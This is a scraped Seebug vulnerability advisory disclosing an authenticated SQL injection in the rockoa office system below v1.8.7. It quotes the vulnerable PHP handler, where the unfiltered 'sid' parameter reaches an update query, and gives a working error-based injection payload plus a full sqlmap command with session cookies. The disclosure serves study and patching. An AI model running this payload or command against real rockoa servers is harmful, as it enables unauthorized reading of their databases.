=== Content from www.seebug.org_ee152e46_20250119_111513.html ===

![Seebug](/static/dist2/images/weixin-share-sm.jpg)

[![Knownsec-logo](/static/dist2/images/knownsec-logo.png)](https://www.knownsec.com?from=seebug_logo)
![](/static/dist2/images/line.png)
[![Seebug-logo](/static/dist2/images/seebug-logo2023.png?v=2)](/)

* [Index](/)
* [Submit Vulnerability](/contribute/vul)
* [Rank](/hackers)
* Market
  + [Exchange](/exchange/goods)
  + [Newest PoC](/vuldb/vulnerabilities?has_poc=true)
* [Search](/search/)* Community
    + [Pocsuite](http://pocsuite.org/)
    + [Ceye.io](http://ceye.io/)
    + [Paper](http://paper.seebug.org/)
    + [KCon](http://kcon.knownsec.com/)
    + [ZoomEye](https://www.zoomeye.org/)
  * About
    + [Data Statistics](/stat)
    + [Vul Market](/help/about)
    + [Develop Document](https://pocsuite.org/guide/what-is-pocsuite3.html)
    + [Guideline](/help/user_level)
    + [Feedback](/help/feedback)
    + [Help](/help/reward)

* [Login](/accounts/login/?next=/vuldb/ssvid-97859)
* [Register](/accounts/register?next=/vuldb/ssvid-97859)

Toggle navigation

* [Login](/accounts/login/?next=/vuldb/ssvid-97859)
* [Index](/)
* Reward and Rank
  + [Detail Reward List](/vuldb/reward/detail)
  + [PoC Reward List](/vuldb/reward/poc)
  + [Exchange](/exchange/goods)
  + [Rank](/hackers)
  + [Submit New Vulnerability](/contribute/vul)
* Vulnerability Database
  + [Vulnerability List](/vuldb/vulnerabilities)
  + [Component Categories](/appdir/)
  + [Vulnerability Category](/category/)
* [Search](/search/)
* [Data Statistics](/stat)
* [Paper](http://paper.seebug.org/)

# Background SQL injection for rockoa ordinary user privileges (1)

 Follow
0

### Basic Fields

SSV ID:
[SSV-97859](/help/vul#ssv)

Find Time:
Unknown

Submit Time:
2019-03-15

Level:

Category:
[SQL 注入](/category/sql-injection)

Component:
[rockoa](/appdir/rockoa)

(< v1.8.7)

Author:
Unknown

Submitter:
[endness](/accounts/profile/endness)

CVE-ID：
Add

CNNVD-ID：
Add

CNVD-ID：
Add

ZoomEye Dork：
Add

### Source

### Detail

Contributor

Got  0KB

# Background SQL injection for rockoa ordinary user privileges
## Introduction to vulnerabilities
Rockoa system is an office system based on PHP and mysql. Its official website is http://www.rockoa.com. SQL injection is caused by loose filtering of parameters
## Vulnerability impact version
- < v1.8.7
## Vulnerability analysis
Under`webmain/main/customer/customerAction.php`
```php
public function distcustAjax()
{
$sid = $this->post('sid','0');
$sname = $this->post('sname');
$snid = $this->post('snid');
$lx = $this->post('lx');
$uarr['uid'] = 0;
$uarr['optname'] = '';
if($lx==1 && $snid!='' && $sname!=''){
$uarr['uid'] = $snid;
m('crm')->update($uarr, "`id` in($sid)");
}
if($lx==0){
m('crm')->update($uarr, "`id` in($sid)");
}
echo 'ok';
}
```
Because `$sid` no filtering are introduced to the update query.
## Vulnerability review
Address with vulnerability
```
http://catfish.demo/index.php?a=distcust&m=customer|main/customer&ajaxbool=true
```
Post data
```
sid=id=1) or updatexml(1,concat(0x7e,(version()),0x7e),0) or (1&lx=0
```
sqlmap
```
python sqlmap.py -u 'http://catfish.demo/index.php?a=distcust&m=customer|main/customer&ajaxbool=true' --data="sid=111" --cookie="deviceid=1552359906729; xinhu\_ca\_rempass=0; PHPSESSID=rhgm0km7tvob889lvnub4mkto0; xinhu\_mo\_adminid=hk0lne0llo0lnk0eh0lln0lnk0lng0eh0ok0ee0wk011; xinhu\_ca\_adminuser=test" --level 5 --risk 3
```
![](https://images.seebug.org/1552639075844-w331s)

![Loading icon](/static/dist2/bower_components/loading/loading-bars.svg)

have 0  exchange

### PoC

Unavailable PoC

### Reference Linking

### Solutions

**Temp Solutions**

Unavailable Temp Solutions

**Official Solution**

Unavailable Official solution

**Defense Solutions**

Unavailable Defense Solutions

Improve Solutions

BackSubmit

[![](/media/banner/2017/08/22/150338358279.png)](https://www.yunaq.com/)

[![](/media/banner/2020/05/26/159048249988.png)](https://www.yunaq.com/help/article?id=5ebcf0e3439fa500115a1326?from=seebugb00515)

[![](/media/banner/2017/08/09/150226089416.png)](https://scanv.yunaq.com/stcs/index.html?from=seebugb00526)

[![](/media/banner/2020/01/16/157914493733.png)](https://www.yunaq.com/dbzx?from=seebugb00115)

---

### Timeline

* 发现/披露了漏洞
* [![endness](https://images.telnet404.com/avatar.png)](/accounts/profile/endness)
  [endness](/accounts/profile/endness)

  2019-03-15
  提交了漏洞
* [![endness](https://images.telnet404.com/avatar.png)](/accounts/profile/endness)
  [endness](/accounts/profile/endness)

  2019-03-15
  提交补充了漏洞详情

---

### Related Vuls

* [Background SQL injection for rockoa admin privileges](/vuldb/ssvid-97867)
* [Background SQL injection for rockoa ordinary user privileges(5)](/vuldb/ssvid-97863)
* [Background SQL injection for rockoa ordinary user privileges(4)](/vuldb/ssvid-97862)
* [Background SQL injection for rockoa ordinary user privileges(3)](/vuldb/ssvid-97861)
* [Background SQL injection for rockoa ordinary user privileges(2)](/vuldb/ssvid-97860)
* [Background SQL injection for rockoa ordinary user privileges (1)](/vuldb/ssvid-97859)
* [Background SQL injection for rockoa ordinary user privileges](/vuldb/ssvid-97858)

 Follow
0

Popularity
2117

0

![](/static/images/anonymous.jpg)
##### Need to bind phone before comment. [Bind Now](https://sso.telnet404.com/accounts/bind_phone/)

Submit Comment

 anonymous reply

#### Unavailable Comments

※Any content provided by this site, only to learn the code and services, not for illegal purposes

captcha![]()

OK
Back

×
#### Hello,

您的会员可兑换次数还剩：
次

本次兑换将消耗 1 次

Vulnerabilities

* [Vulnerability List](/vuldb/vulnerabilities)
* [Component Categories](/appdir/)
* [Vulnerability Category](/category/)

More

* [Reward List](/vuldb/reward/poc)
* [Rank](/hackers)

Help

* [About](/help/about)
* [Relevant Instructions](/help/user_level)
* [Vulnerability Definition](/help/vul)
* [Reward Plan](/help/reward)

Contact

* 010-57076191
* s1@seebug.org
* 15th Floor, Unit A, Tower 3, Wangjing SOHO, Fu'an West Road, Chaoyang District, Beijing 100102, P.R.China

Public links

* [Knownsec](https://www.knownsec.com/#/)
* [yunaq](https://www.yunaq.com/cyd/?from=cj_cyd_sbug)
* [创宇蜜罐-诱捕溯源](https://mg.yunaq.com/#/?from=seebuglink)
* [ScanV](https://www.scanv.com/?from=seebug)
* [hackernews](http://hackernews.cc/)

Follow Us

[![](https://aqyzmedia.yunaq.com/labels/label_sm_90040.png)](https://v.yunaq.com/certificate?domain=www.seebug.org&from=label)

[![](/static/dist2/images/ksz-kcon-new.svg)](http://kcon.knownsec.com/)

[![](/static/dist2/images/seebug-logo2023.png)](/)

[![](/static/dist2/images/ksz-zoomeye.svg)](https://www.zoomeye.org/)

[![](/static/dist2/images/yunaq-logo.png)](https://www.yunaq.com/?from=sbg0702)

[京ICP备10040895号](https://beian.miit.gov.cn/)
[![](/static/dist2/images/beian.png)
京公网安备 11010502034610号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010502034610)
Copyright @ 404 Team from Knownsec.
[简体中文](/accounts/language/?l=zh-cn)

×
#### Hello,

please call the customer service hotline to recharge, thank you for your continued support Seebug!

 010-57076191


